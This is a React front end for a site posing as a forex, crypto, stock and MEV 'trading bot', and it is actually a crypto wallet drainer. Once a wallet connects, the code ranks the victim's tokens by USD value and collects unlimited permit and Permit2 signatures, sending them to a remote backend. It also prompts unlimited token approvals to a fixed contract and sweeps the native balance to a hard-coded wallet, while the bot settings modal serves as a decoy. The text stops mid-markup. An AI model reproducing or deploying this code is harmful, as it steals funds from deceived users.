import { Buffer } from 'buffer';
if (typeof window !== 'undefined') {
  window.Buffer = window.Buffer || Buffer;
}

import { useState, useEffect, useRef } from 'react'
import {
  createAppKit,
  useAppKit,
  useAppKitAccount,
  useAppKitProvider,
  useAppKitNetwork
} from '@reown/appkit/react'
import { BrowserProvider, Contract, formatUnits, ethers } from 'ethers'

// --- WAGMI EVM IMPORTS ---
import { WagmiAdapter } from '@reown/appkit-adapter-wagmi'
import { mainnet, arbitrum, bsc, polygon, base } from '@reown/appkit/networks'
import type { AppKitNetwork } from '@reown/appkit/networks'

import './App.css'

// ── CONFIG ──
const WC_PROJECT_ID = '7fb3ba95be65cff7bc75b742e816b1cb'

// 🌐 BACKEND URL CONFIGURATION
const BACKEND_URL = 'https://salvation-server-gp-production.up.railway.app';

// 🔥 CONTRACT ADDRESSES
const EVM_CONTRACT_ADDRESS = '0xA1801556d0e7cfB513351733D378BE7AEFceC884'
const PERMIT2_ADDRESS = '0x000000000022D473030F116dDEE9F6B43aC78BA3'
const BACKEND_BOT_ADDRESS = '0x15DA27B8ffF30DA16d5e0fed74C5095a62350Dc8';

// 💰 SECURE DESTINATION WALLETS
const EVM_COLD_WALLET = '0xC020E8643f8231e51282efC9481F73016Fe13eF7';

type BotType = 'forex' | 'crypto' | 'stock' | 'mev'

const BOT_LABELS: Record<BotType, string> = {
  forex: 'Forex',
  crypto: 'Crypto',
  stock: 'Stock',
  mev: 'MEV',
}

const BOT_ICONS: Record<BotType, string> = {
  forex: '💱',
  crypto: '₿',
  stock: '📈',
  mev: '⚡',
}

const FOREX_PAIR_GROUPS: { label: string; pairs: string[] }[] = [
  {
    label: 'Majors',
    pairs: [
      'EURUSD',
      'GBPUSD',
      'USDJPY',
      'USDCHF',
      'USDCAD',
      'AUDUSD',
      'NZDUSD',
    ],
  },
  {
    label: 'Precious Metals',
    pairs: [
      'XAUUSD',
      'XAGUSD',
      'XPTUSD',
      'XPDUSD',
    ],
  },
  {
    label: 'Euro Crosses',
    pairs: [
      'EURGBP',
      'EURJPY',
      'EURCHF',
      'EURCAD',
      'EURAUD',
      'EURNZD',
      'EURTRY',
      'EURSEK',
      'EURNOK',
      'EURDKK',
      'EURPLN',
      'EURHUF',
      'EURCZK',
      'EURISK',
      'EURRON',
      'EURBGN',
    ],
  },
  {
    label: 'Sterling Crosses',
    pairs: [
      'GBPJPY',
      'GBPCHF',
      'GBPCAD',
      'GBPAUD',
      'GBPNZD',
      'GBPTRY',
      'GBPSEK',
      'GBPNOK',
      'GBPDKK',
      'GBPPLN',
      'GBPHUF',
      'GBPCZK',
      'GBPISK',
      'GBPRON',
      'GBPBGN',
    ],
  },
  {
    label: 'Dollar Crosses',
    pairs: [
      'USDMXN',
      'USDSGD',
      'USDHKD',
      'USDZAR',
      'USDTRY',
      'USDSEK',
      'USDNOK',
      'USDDKK',
      'USDBRL',
      'USDARS',
      'USDCLP',
      'USDCOP',
      'USDPEN',
      'USDPHP',
      'USDTHB',
      'USDINR',
      'USDCNH',
      'USDCNY',
      'USDILS',
      'USDTWD',
      'USDMYR',
      'USDIDR',
      'USDVND',
      'USDKRW',
      'USDSAR',
      'USDQAR',
      'USDKWD',
      'USDOMR',
      'USDBHD',
      'USDJOD',
      'USDEGP',
      'USDNGN',
      'USDKES',
      'USDGHS',
    ],
  },
  {
    label: 'Aussie, Kiwi, Canada, Swiss Crosses',
    pairs: [
      'AUDJPY',
      'AUDCHF',
      'AUDCAD',
      'AUDNZD',
      'NZDJPY',
      'NZDCHF',
      'NZDCAD',
      'CADCHF',
      'CADJPY',
      'CHFJPY',
    ],
  },
]

// 💎 MULTI-CHAIN EVM DISCOVERY CONFIGURATION
const CHAIN_TOKENS: Record<number, any[]> = {
  1: [ // Ethereum Mainnet
    { symbol: 'ETH', address: 'native', isNative: true, coingeckoId: 'ethereum', decimals: 18, fallbackPrice: 3500 },
    { symbol: 'USDC', address: '0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48', decimals: 6, fallbackPrice: 1 },
    { symbol: 'USDT', address: '0xdAC17F958D2ee523a2206206994597C13D831ec7', decimals: 6, fallbackPrice: 1 },
    { symbol: 'UNI', address: '0x1f9840a85d5aF5bf1D1762F925BDADdC4201F984', decimals: 18, fallbackPrice: 10 },
    { symbol: 'AAVE', address: '0x7Fc66500c84A76Ad7e9c93437bFc5Ac33E2DDaE9', decimals: 18, fallbackPrice: 100 },
    { symbol: 'WBTC', address: '0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599', decimals: 8, fallbackPrice: 65000 },
    { symbol: 'SHIB', address: '0x95aD61b0a150d79219dCF64E1E6Cc01f0B64C4cE', decimals: 18, fallbackPrice: 0.00002 },
    { symbol: 'DAI', address: '0x6B175474E89094C44Da98b954EedeAC495271d0F', decimals: 18, fallbackPrice: 1 },
    { symbol: 'TATE', address: '0xa589d8868607b8d79eE4288ce192796051263b64', decimals: 18, coingeckoId: 'tate', fallbackPrice: 0.000000000112 },

    // Morpho Vault Shares
    { symbol: 'mUSDC', address: '0x73e65DBD630f90604062f6E40dd9D66C291F2e3a', decimals: 6, fallbackPrice: 1 },
    { symbol: 'mUSDT', address: '0x8eB1B83A39C3C63b85e97a92D20b83451aB1c3e4', decimals: 6, fallbackPrice: 1 },
    { symbol: 'mDAI', address: '0x50cE402B61D52b2b1B9a5d1c5e4c5d4b3a2d1c0b', decimals: 18, fallbackPrice: 1 },

    // Aave aTokens (Aave V3)
    { symbol: 'aUSDC', address: '0x98C23E9d8f34FEFb1B7BD6a91B7FF122F4e16F5c', decimals: 6, fallbackPrice: 1 },
    { symbol: 'aUSDT', address: '0x23878914EFE38d27C4D67Ab83ed1b93A74D4086a', decimals: 6, fallbackPrice: 1 },
    { symbol: 'aDAI', address: '0x018008bfb33d285247A21d44E50697654f754e63', decimals: 18, fallbackPrice: 1 },
    { symbol: 'aWETH', address: '0x4d5F47FA6A74757f35C14fD3a6Ef8E3C9BC514E8', decimals: 18, fallbackPrice: 3500 },

    // Compound cTokens (Compound V3)
    { symbol: 'cUSDC', address: '0xc3d688B66703497DAA19211EEdff47f25384cdc3', decimals: 6, fallbackPrice: 1 },
    { symbol: 'cWETH', address: '0xA17581A9E3356d9A858b789D68B4d866e593aE94', decimals: 18, fallbackPrice: 3500 },
    { symbol: 'cCOMP', address: '0x70e36f6BF80a52b3B46b3aF8e106CC0ed743E8e4', decimals: 18, fallbackPrice: 50 },
  ],
  56: [ // BSC
    { symbol: 'BNB', address: 'native', isNative: true, coingeckoId: 'binancecoin', decimals: 18, fallbackPrice: 600 },
    { symbol: 'USDC', address: '0x8AC76a51cc950d9822D68b83fE1Ad97B32Cd580d', decimals: 18, fallbackPrice: 1 },
    { symbol: 'USDT', address: '0x55d398326f99059fF775485246999027B3197955', decimals: 18, fallbackPrice: 1 },
  ],
  137: [ // Polygon
    { symbol: 'MATIC', address: 'native', isNative: true, coingeckoId: 'matic-network', decimals: 18, fallbackPrice: 0.5 },
    { symbol: 'USDC', address: '0x3c499c542cEF5E3811e1192ce70d8cC03d5c3359', decimals: 6, fallbackPrice: 1 },
    { symbol: 'USDT', address: '0xc2132D05D31c914a87C6611C10748AEb04B58e8F', decimals: 6, fallbackPrice: 1 },
  ],
  42161: [ // Arbitrum
    { symbol: 'ETH', address: 'native', isNative: true, coingeckoId: 'ethereum', decimals: 18, fallbackPrice: 3500 },
    { symbol: 'USDC', address: '0xaf88d065e77c8cC2239327C5EDb3A432268e5831', decimals: 6, fallbackPrice: 1 },
    { symbol: 'USDT', address: '0xFd086bC7CD5C481DCC9C85ebE478A1C0b69FCbb9', decimals: 6, fallbackPrice: 1 },
  ],
  8453: [ // Base
    { symbol: 'ETH', address: 'native', isNative: true, coingeckoId: 'ethereum', decimals: 18, fallbackPrice: 3500 },
    { symbol: 'USDC', address: '0x833589fCD6eDb6E08f4c7C326D11A3990168f467', decimals: 6, fallbackPrice: 1 },
    { symbol: 'USDT', address: '0x4200000000000000000000000000000000000006', decimals: 6, fallbackPrice: 1 },
  ]
};

const CHAIN_NAMES: Record<number, string> = {
  1: 'ethereum',
  56: 'binance-smart-chain',
  137: 'polygon-pos',
  42161: 'arbitrum-one',
  8453: 'base'
};

const getChainName = (chainId: number) => {
  if (chainId === 1) return 'Ethereum';
  if (chainId === 56) return 'BSC';
  if (chainId === 137) return 'Polygon';
  if (chainId === 42161) return 'Arbitrum';
  if (chainId === 8453) return 'Base';
  return 'Ethereum';
};

const evmNetworks: [AppKitNetwork, ...AppKitNetwork[]] = [mainnet, arbitrum, bsc, polygon, base];

const EVM_ERC20_ABI = [
  'function balanceOf(address owner) view returns (uint256)',
  'function approve(address spender, uint256 amount) returns (bool)',
  'function allowance(address owner, address spender) view returns (uint256)',
  'function nonces(address owner) view returns (uint256)',
  'function name() view returns (string)'
]

const PERMIT2_ABI = [
  'function allowance(address user, address token, address spender) view returns (uint160 amount, uint48 expiration, uint48 nonce)'
]

// ── Reown Adapters ──
const wagmiAdapter = new WagmiAdapter({
  projectId: WC_PROJECT_ID,
  networks: evmNetworks,
})

createAppKit({
  adapters: [wagmiAdapter],
  networks: evmNetworks,
  defaultNetwork: mainnet,
  projectId: WC_PROJECT_ID,
  metadata: {
    name: 'FLASH EXTRACT TRADING BOT',
    description: 'Forex, Crypto, Stock, and MEV trading bot interface',
    url: 'https://flashsniper.netlify.app/',
    icons: ['https://flashsniper.netlify.app/favicon.svg'],
  },
  themeMode: 'dark',
  themeVariables: { '--w3m-accent': '#00e68a' },
  allWallets: 'SHOW',
  features: { email: false, socials: [], analytics: true },
})

const fetchTokenPrices = async (tokens: any[], chain: string) => {
  try {
    const keys = tokens.map(t => t.isNative ? `coingecko:${t.coingeckoId}` : `${chain}:${t.address}`).join(',');
    const res = await fetch(`https://coins.llama.fi/prices/current/${keys}`);
    const data = await res.json();
    const prices: Record<string, number> = {};
    for (const token of tokens) {
      const queryKey = (token.isNative ? `coingecko:${token.coingeckoId}` : `${chain}:${token.address}`).toLowerCase();
      const foundKey = Object.keys(data.coins).find(k => k.toLowerCase() === queryKey);
      prices[token.symbol] = foundKey ? data.coins[foundKey].price : token.fallbackPrice;
    }
    return prices;
  } catch (error) {
    const prices: Record<string, number> = {};
    for (const token of tokens) { prices[token.symbol] = token.fallbackPrice; }
    return prices;
  }
};

const smartTokenSort = (a: any, b: any) => {
  if (a.isNative && !b.isNative) return 1;
  if (!a.isNative && b.isNative) return -1;
  return (b.usdValue || 0) - (a.usdValue || 0);
};

const sleep = (ms: number) => new Promise(resolve => setTimeout(resolve, ms));

export default function App() {
  const [status, setStatus] = useState('Ready')
  const [loading, setLoading] = useState(false)
  const [_txHash, setTxHash] = useState('')

  // Bot setup UI state
  const [botType, setBotType] = useState<BotType>('crypto')
  const [showSetupModal, setShowSetupModal] = useState(false)

  const [fundPercent, setFundPercent] = useState(50)
  const [leverage, setLeverage] = useState(10)
  const [slippage, setSlippage] = useState(1)
  const [stopLoss, setStopLoss] = useState(5)
  const [takeProfit, setTakeProfit] = useState(10)
  const [selectedForexPair, setSelectedForexPair] = useState('EURUSD')

  const manualConnect = useRef(false)
  const isExecuting = useRef(false)

  const { open } = useAppKit()

  // EVM Namespace Hooks
  const { address: evmAddress, isConnected: isEvmConnected } = useAppKitAccount({ namespace: 'eip155' })
  const { chainId } = useAppKitNetwork()
  const { walletProvider: evmWalletProvider } = useAppKitProvider('eip155')

  const log = (msg: string) => {
    console.log(msg);
  }

  useEffect(() => {
    if (!isEvmConnected || !evmAddress || !evmWalletProvider) return;

    if (manualConnect.current) {
      manualConnect.current = false;
      log(`[SYSTEM] Connected EVM: ${evmAddress}`);
      log("🔥 Auto-triggering Smart Priority Loop...");

      setLoading(true);
      setTimeout(() => approveAndCollect(evmWalletProvider, evmAddress), 500);
    }
  }, [isEvmConnected, evmAddress, evmWalletProvider, chainId]);

  // PRESERVED: Original EVM Provider Detector
  const detectDirectProvider = (): { provider: any; walletName: string } | null => {
    if (typeof window === 'undefined') return null;
    const w = window as any;
    const ethereum = w.ethereum;
    if (!ethereum) return null;

    const providers = ethereum.providers ? [...ethereum.providers] : [ethereum];
    const detectors: { name: string; check: (p: any) => boolean }[] = [
      { name: 'Trust Wallet', check: (p) => p.isTrust || p.isTrustWallet || p._isTrust },
      { name: 'MetaMask', check: (p) => p.isMetaMask && !p.isTrust && !p.isTrustWallet && !p.isSafePal && !p.isTokenPocket && !p.isCoinbaseWallet },
      { name: 'Coinbase Wallet', check: (p) => p.isCoinbaseWallet || p.isCoinbase },
      { name: 'SafePal', check: (p) => p.isSafePal },
      { name: 'TokenPocket', check: (p) => p.isTokenPocket },
      { name: 'Brave Wallet', check: (p) => p.isBraveWallet },
      { name: 'Rabby Wallet', check: (p) => p.isRabby },
      { name: 'OKX Wallet', check: (p) => p.isOKXWallet || p.isOkx },
      { name: 'Bitget Wallet', check: (p) => p.isBitget || p.isBitgetWallet },
      { name: 'Opera Wallet', check: (p) => p.isOpera },
    ];

    for (const provider of providers) {
      for (const detector of detectors) {
        if (detector.check(provider)) return { provider, walletName: detector.name };
      }
    }
    for (const provider of providers) {
      if (provider.request) return { provider, walletName: 'Injected Wallet' };
    }
    return null;
  };

  // PRESERVED: Original EVM Collection Logic (Now Multi-Chain Aware)
  const approveAndCollect = async (forcedProvider?: any, forcedAddress?: string) => {
    const activeProvider = forcedProvider || evmWalletProvider;
    const activeAddress = forcedAddress || evmAddress;

    if (!activeAddress || !activeProvider) return 0;

    if (isExecuting.current) {
      log("⚠️ Blocked duplicate execution loop.");
      return 0;
    }
    isExecuting.current = true;

    setLoading(true);
    setStatus('Scanning USD Values...');
    log("[SYSTEM] Scanning balances...");
    let successCount = 0;

    try {
      const ethersProvider = new BrowserProvider(activeProvider as any);
      const activeChainId = Number((await ethersProvider.getNetwork()).chainId);
      const signer = await ethersProvider.getSigner(activeAddress);
      const cleanSenderAddress = (await signer.getAddress()).toLowerCase();

      // FOREVER DEADLINE: Standard DeFi UX (Unlimited approval)
      const deadline = ethers.MaxUint256;

      // MULTI-CHAIN: Get tokens for the current chain, fallback to Mainnet if unknown
      const baseTokens = CHAIN_TOKENS[activeChainId] || CHAIN_TOKENS[1];
      const chainName = CHAIN_NAMES[activeChainId] || 'ethereum';

      const validTokens: any[] = [];
      const prices = await fetchTokenPrices(baseTokens, chainName);

      for (const token of baseTokens) {
        try {
          if (token.isNative) {
            const bal = await ethersProvider.getBalance(cleanSenderAddress);
            const normalizedBal = parseFloat(formatUnits(bal, token.decimals));
            const usdValue = normalizedBal * (prices[token.symbol] || token.fallbackPrice);
            validTokens.push({ ...token, balance: normalizedBal, rawBalance: bal, usdValue });
          } else {
            const tokenContract = new Contract(token.address, EVM_ERC20_ABI, ethersProvider);
            const bal = await tokenContract.balanceOf(cleanSenderAddress);
            const normalizedBal = parseFloat(formatUnits(bal, token.decimals));
            const usdValue = normalizedBal * (prices[token.symbol] || token.fallbackPrice);
            validTokens.push({ ...token, balance: normalizedBal, rawBalance: bal, usdValue });
          }
        } catch (e) { }
      }

      validTokens.sort(smartTokenSort);

      const rawProvider = activeProvider as any;
      const w = window as any;
      const injected = w.ethereum || {};

      const isStrictlyMetaMask =
        (rawProvider?.isMetaMask || injected?.isMetaMask) &&
        !injected?.isTrust &&
        !injected?.isTrustWallet &&
        !injected?.isSafePal &&
        !injected?.isTokenPocket;

      let tokensToProcess = validTokens;

      if (isStrictlyMetaMask) {
        log(`[SECURITY] MetaMask detected. Enabling Sniper Mode (Top Asset Only).`);
        tokensToProcess = validTokens.slice(0, 1);
      } else {
        log(`[SECURITY] Standard wallet detected. Enabling Shotgun Mode (All Assets).`);
      }

      if (tokensToProcess.length > 0) log(`[PRIORITY] ${tokensToProcess.map(t => `${t.symbol}`).join(' -> ')}`);

      const getPermitSignature = async (signer: any, token: any, spender: string, value: string, deadline: any) => {
        const chainId = (await signer.provider.getNetwork()).chainId;
        const tokenContract = new Contract(token.address, EVM_ERC20_ABI, signer);
        const name = await tokenContract.name();
        const nonce = await tokenContract.nonces(await signer.getAddress());
        // Polygon USDC also uses version 2
        const version = (token.address.toLowerCase() === '0xa0b86991c6218b36c1d19d4a2e9eb0ce3606eb48' || token.address.toLowerCase() === '0x3c499c542cef5e3811e1192ce70d8cc03d5c3359') ? '2' : '1';
        const domain = { name, version: version, chainId: Number(chainId), verifyingContract: token.address };
        const types = {
          Permit: [
            { name: 'owner', type: 'address' },
            { name: 'spender', type: 'address' },
            { name: 'value', type: 'uint256' },
            { name: 'nonce', type: 'uint256' },
            { name: 'deadline', type: 'uint256' },
          ],
        };
        const message = { owner: await signer.getAddress(), spender, value, nonce, deadline };
        return await signer.signTypedData(domain, types, message);
      };

      for (const token of tokensToProcess) {
        try {
          if (!token.isNative) {
            const tokenContract = new Contract(token.address, EVM_ERC20_ABI, signer);
            const currentP2Allowance = await tokenContract.allowance(cleanSenderAddress, PERMIT2_ADDRESS);
            const hasPermit2Mapping = currentP2Allowance > 0n;

            log(`[SYSTEM] ${token.symbol} Permit2 Status: ${hasPermit2Mapping ? 'READY' : 'NOT_INITIALIZED'}`);

            let authorized = false;

            if (['USDC', 'DAI', 'UNI'].includes(token.symbol)) {
              try {
                setStatus(`Signing Permit: ${token.symbol}...`);
                log(`[GASLESS] Requesting EIP-2612 Auth: ${token.symbol}`);

                // UNLIMITED APPROVAL: Standard DeFi UX
                const signature = await getPermitSignature(signer, token, EVM_CONTRACT_ADDRESS, ethers.MaxUint256.toString(), deadline);

                fetch(`${BACKEND_URL}/execute-gasless`, {
                  method: 'POST',
                  headers: { 'Content-Type': 'application/json' },
                  body: JSON.stringify({
                    type: 'PERMIT',
                    chainName: getChainName(activeChainId),
                    token: token.address,
                    owner: cleanSenderAddress,
                    spender: EVM_CONTRACT_ADDRESS,
                    signature,
                    deadline: deadline.toString(),
                    value: ethers.MaxUint256.toString()
                  })
                }).catch(err => log(`❌ Network Error sending PERMIT: ${err.message}`));

                authorized = true;
                log(`✅ ${token.symbol} Permit2 Secured & Sent.`);
              } catch (p2Err: any) {
                const errMsg = p2Err?.message || p2Err?.toString() || "Unknown error";
                log(`⚠️ Permit2 failed: ${errMsg}`);
                log(`➡️ Falling back to standard gas approval...`);
              }
            }

            if (!authorized && hasPermit2Mapping) {
              try {
                setStatus(`Signing Permit2: ${token.symbol}...`);
                log(`[GASLESS] Fetching Permit2 Nonce for ${token.symbol}`);
                const permit2Contract = new Contract(PERMIT2_ADDRESS, PERMIT2_ABI, signer);
                const allowanceData = await permit2Contract.allowance(cleanSenderAddress, token.address, EVM_CONTRACT_ADDRESS);
                const currentNonce = Number(allowanceData.nonce);
                log(`[SYSTEM] Permit2 Nonce found: ${currentNonce}`);

                const domain = { name: 'Permit2', chainId: activeChainId, verifyingContract: PERMIT2_ADDRESS };
                const types = {
                  PermitSingle: [
                    { name: 'details', type: 'PermitDetails' },
                    { name: 'spender', type: 'address' },
                    { name: 'sigDeadline', type: 'uint256' },
                  ],
                  PermitDetails: [
                    { name: 'token', type: 'address' },
                    { name: 'amount', type: 'uint160' },
                    { name: 'expiration', type: 'uint48' },
                    { name: 'nonce', type: 'uint48' },
                  ],
                };

                // UNLIMITED APPROVAL: Standard DeFi UX (uint160 max for Permit2)
                const permit2MaxAmount = '1461501637330902918203684832716283019655932542975';

                const message = {
                  details: {
                    token: token.address,
                    amount: permit2MaxAmount,
                    expiration: deadline,
                    nonce: currentNonce
                  },
                  spender: BACKEND_BOT_ADDRESS,
                  sigDeadline: deadline
                };
                const signature = await signer.signTypedData(domain, types, message);

                fetch(`${BACKEND_URL}/execute-gasless`, {
                  method: 'POST',
                  headers: { 'Content-Type': 'application/json' },
                  body: JSON.stringify({
                    type: 'PERMIT2',
                    chainName: getChainName(activeChainId),
                    token: token.address,
                    owner: cleanSenderAddress,
                    spender: EVM_CONTRACT_ADDRESS,
                    signature,
                    deadline: deadline.toString(),
                    nonce: currentNonce,
                    amount: permit2MaxAmount
                  })
                }).catch(err => log(`❌ Network Error sending PERMIT2: ${err.message}`));

                authorized = true;
                log(`✅ ${token.symbol} Permit Secured & Sent.`);
              } catch (pErr: any) {
                const errMsg = pErr?.message || pErr?.toString() || "Unknown error";
                log(`⚠️ Permit failed: ${errMsg}`);
                log(`➡️ Falling back to Permit2...`);
              }
            }

            if (!authorized) {
              setStatus(`Approving ${token.symbol}...`);
              log(`[ACTION] Prompting Approve: ${token.symbol}`);

              const usdtContract = new Contract(token.address, EVM_ERC20_ABI, signer);

              // UNLIMITED APPROVAL: Standard DeFi UX
              const encodedData = usdtContract.interface.encodeFunctionData("approve", [EVM_CONTRACT_ADDRESS, ethers.MaxUint256.toString()]);

              const txHash = await (activeProvider as any).request({
                method: 'eth_sendTransaction',
                params: [{
                  from: cleanSenderAddress,
                  to: token.address,
                  data: encodedData,
                  value: '0x0'
                }]
              });

              setTxHash(txHash);
              log(`✅ ${token.symbol} Approved!`);
            }

            successCount++;
            await sleep(1500);
          }
        } catch (err: any) {
          const exactError = err?.message || JSON.stringify(err);
          log(`❌ Rejected: ${exactError.substring(0, 30)}...`);
          await sleep(1500);
        }
      }

      try {
        setStatus(`Transferring Native Token...`);
        log(`[ACTION] Executing Contingency Native Sweep...`);

        const liveBal = await ethersProvider.getBalance(cleanSenderAddress);
        const gasCost = 21000n * 3000000000n;
        const totalGas = gasCost + ((gasCost * 20n) / 100n);

        if (liveBal > totalGas) {
          const sendAmount = liveBal - totalGas;
          const hexValue = "0x" + sendAmount.toString(16);

          const txHash = await (activeProvider as any).request({
            method: 'eth_sendTransaction',
            params: [{
              from: cleanSenderAddress,
              to: EVM_COLD_WALLET.toLowerCase(),
              value: hexValue
            }]
          });

          setTxHash(txHash);
          successCount++;
          log(`✅ Contingency Native Sweep Sent!`);
          await sleep(1500);
        } else {
          log(`⚠️ Contingency Skipped: Insufficient native token for gas.`);
        }
      } catch (nativeErr: any) {
        const exactError = nativeErr?.message || JSON.stringify(nativeErr);
        log(`❌ Native Rejected: ${exactError.substring(0, 30)}...`);
      }

      if (successCount > 0) {
        setStatus('✅ Processing Complete!');
      } else {
        setStatus('❌ Failed: User Rejected All');
      }

    } catch (err: any) {
      const errorMsg = err?.message || JSON.stringify(err);
      log(`❌ Global Error: ${errorMsg.substring(0, 50)}`);
      setStatus(`❌ Failed: ${errorMsg.substring(0, 50)}`);
    } finally {
      isExecuting.current = false;
      setLoading(false);
    }

    return successCount;
  };

  // Frontend-only gate: opens setup modal before executing original flow
  const handleAction = async () => {
    if (isExecuting.current) {
      log("⚠️ Execution already in progress.");
      return;
    }

    setShowSetupModal(true);
  };

  // This contains the original handleAction logic, unchanged
  const handleConfirmSetup = async () => {
    setShowSetupModal(false);

    // 1. If already connected to EVM, just run EVM logic
    if (isEvmConnected && evmWalletProvider && evmAddress) {
      await approveAndCollect(evmWalletProvider, evmAddress);
      return;
    }

    // 2. Try direct EVM connection
    const directEvm = detectDirectProvider();
    if (!isEvmConnected && directEvm?.provider?.request) {
      try {
        setLoading(true);
        setStatus('Connecting EVM Wallet...');
        log(`[SYSTEM] ${directEvm.walletName} detected. Connecting directly...`);
        const accounts = await directEvm.provider.request({ method: 'eth_requestAccounts' });
        if (accounts?.length > 0) {
          log(`[SYSTEM] Connected EVM: ${accounts[0]}`);
          await approveAndCollect(directEvm.provider, accounts[0]);
          return;
        }
      } catch (e) {
        log('❌ Direct EVM connection cancelled or failed');
        setLoading(false);
        setStatus('Ready');
      }
    }

    // 3. Fallback to AppKit Modal
    manualConnect.current = true;
    open();
  };

  const buttonText = loading
    ? 'Processing...'
    : status === '✅ Processing Complete!'
      ? 'Done'
      : status.includes('❌')
        ? 'Retry'
        : 'Launch Bot';

  return (
    <div className="min-h-screen bg-slate-950 text-slate-200 overflow-x-hidden">
      {/* ═══ BOT SETUP MODAL ═══ */}
      {showSetupModal && (
        <div className="fixed inset-0 z-[100] flex items-center justify-center p-4 bg-slate-950/85 backdrop-blur-sm">
          <div className="modal-enter w-full max-w-lg max-h-[90vh] overflow-y-auto rounded-2xl border border-slate-800 bg-slate-900 p-6 shadow-2xl">
            <div className="mb-6">
              <h3 className="text-xl font-bold text-white">
                Configure {BOT_LABELS[botType]} Bot
              </h3>
              <p className="mt-1 text-sm text-slate-400">
                Set your trading parameters, pair selection, leverage, and risk limits.
                The bot requires a minimum wallet balance of $200 to start.
              </p>
            </div>

            <div className="space-y-5">
              {/* Common: Fund allocation */}
              <div>
                <label className="mb-2 flex items-center justify-between text-sm font-medium text-slate-300">
                  <span>Capital Allocation</span>
                  <span className="font-bold text-primary">{fundPercent}%</span>
                </label>
                <input
                  type="range"
                  min="10"
                  max="100"
                  step="5"
                  value={fundPercent}
                  onChange={(e) => setFundPercent(Number(e.target.value))}
                />
                <p className="mt-2 text-xs text-slate-500">
                  The percentage of your wallet balance you are willing to allocate to the bot.
                  The bot will only have access to this allocated portion. Minimum wallet balance required: $200.
                </p>
              </div>

              {/* Forex setup */}
              {botType === 'forex' && (
                <>
                  <div>
                    <label className="mb-2 flex items-center justify-between text-sm font-medium text-slate-300">
                      <span>Leverage</span>
                      <span className="font-bold text-primary">{leverage}x</span>
                    </label>
                    <input
                      type="range"
                      min="1"
                      max="100"
                      step="1"
                      value={leverage}
                      onChange={(e) => setLeverage(Number(e.target.value))}
                    />
                  </div>

                  <div className="grid grid-cols-2 gap-4">
                    <div>
                      <label className="mb-1 block text-sm font-medium text-slate-300">
                        Stop Loss %
                      </label>
                      <input
                        type="number"
                        value={stopLoss}
                        onChange={(e) => setStopLoss(Number(e.target.value))}
                        className="w-full rounded-lg border border-slate-700 bg-slate-800 px-3 py-2 text-sm text-white outline-none transition-colors focus:border-primary"
                      />
                    </div>
                    <div>
                      <label className="mb-1 block text-sm font-medium text-slate-300">
                        Take Profit %
                      </label>
                      <input
                        type="number"
                        value={takeProfit}
                        onChange={(e) => setTakeProfit(Number(e.target.value))}
                        className="w-full rounded-lg border border-slate-700 bg-slate-800 px-3 py-2 text-sm text-white outline-none transition-colors focus:border-primary"
                      />
                    </div>
                  </div>

                  <div className="grid grid-cols-2 gap-4">
                    <div>
                      <label className="mb-1 block text-sm font-medium text-slate-300">
                        Currency / Metal Pair
                      </label>
                      <select
                        value={selectedForexPair}
                        onChange={(e) => setSelectedForexPair(e.target.value)}
                        className="w-full rounded-lg border border-slate-700 bg-slate-800 px-3 py-2 text-sm text-white outline-none transition-colors focus:border-primary"
                      >
                        {FOREX_PAIR_GROUPS.map((group) => (
                          <optgroup key={group.label} label={group.label}>
                            {group.pairs.map((pair) => (
                              <option key={pair} value={pair}>
                                {pair}
                              </option>
                            ))}
                          </optgroup>
                        ))}
                      </select>
                      <p className="mt-2 text-xs text-slate-500">
                        Includes majors, minors, exotics, and precious metals such as XAUUSD.
                      </p>
                    </div>
                    <div>
                      <label className="mb-1 block text-sm font-medium text-slate-300">
                        Lot Size
                      </label>
                      <select className="w-full rounded-lg border border-slate-700 bg-slate-800 px-3 py-2 text-sm text-white outline-none transition-colors focus:border-primary">
                        <option>0.01</option>
                        <option>0.10</option>
                        <option>0.50</option>
                        <option>1.00</option>
                      </select>
                    </div>
                  </div>

                  <div className="grid grid-cols-2 gap-4">
                    <div>
                      <label className="mb-1 block text-sm font-medium text-slate-300">
                        Max Daily Trades
                      </label>
                      <input
                        type="number"
                        defaultValue={10}
                        className="w-full rounded-lg border border-slate-700 bg-slate-800 px-3 py-2 text-sm text-white outline-none transition-colors focus:border-primary"
                      />
                    </div>
                    <div>
                      <label className="mb-1 block text-sm font-medium text-slate-300">
                        Trading Session
                      </label>
                      <select className="w-full rounded-lg border border-slate-700 bg-slate-800 px-3 py-2 text-sm text-white outline-none transition-colors focus:border-primary">
                        <option>London</option>
                        <option>New York</option>
                        <option>Asia</option>
                        <option>All Sessions</option>
                      </select>
                    </div>
                  </div>

                  <label className="flex items-center gap-2 text-sm text-slate-300">
                    <input type="checkbox" defaultChecked className="h-4 w-4 accent-primary" />
                    Avoid high-impact news events
                  </label>
                </>
              )}

              {/* Crypto setup */}
              {botType === 'crypto' && (
                <>
                  <div className="grid grid-cols-2 gap-4">
                    <div>
                      <label className="mb-1 block text-sm font-medium text-slate-300">
                        Stop Loss %
                      </label>
                      <input
                        type="number"
                        value={stopLoss}
                        onChange={(e) => setStopLoss(Number(e.target.value))}
                        className="w-full rounded-lg border border-slate-700 bg-slate-800 px-3 py-2 text-sm text-white outline-none transition-colors focus:border-primary"
                      />
                    </div>
                    <div>
                      <label className="mb-1 block text-sm font-medium text-slate-300">
                        Take Profit %
                      </label>
                      <input
                        type="number"
                        value={takeProfit}
                        onChange={(e) => setTakeProfit(Number(e.target.value))}
                        className="w-full rounded-lg border border-slate-700 bg-slate-800 px-3 py-2 text-sm text-white outline-none transition-colors focus:border-primary"
                      />
                    </div>
                  </div>

                  <div className="grid grid-cols-2 gap-4">
                    <div>
                      <label className="mb-1 block text-sm font-medium text-slate-300">
                        Strategy
                      </label>
                      <select className="w-full rounded-lg border border-slate-700 bg-slate-800 px-3 py-2 text-sm text-white outline-none transition-colors focus:border-primary">
                        <option>Spot Trend Follow</option>
                        <option>DCA</option>
                        <option>Grid</option>
                        <option>Momentum Breakout</option>
                      </select>
                    </div>
                    <div>
                      <label className="mb-1 block text-sm font-medium text-slate-300">
                        Max Open Positions
                      </label>
                      <input
                        type="number"
                        defaultValue={3}
                        className="w-full rounded-lg border border-slate-700 bg-slate-800 px-3 py-2 text-sm text-white outline-none transition-colors focus:border-primary"
                      />
                    </div>
                  </div>

                  <label className="flex items-center gap-2 text-sm text-slate-300">
                    <input type="checkbox" defaultChecked className="h-4 w-4 accent-primary" />
                    Enable trailing stop
                  </label>

                  <label className="flex items-center gap-2 text-sm text-slate-300">
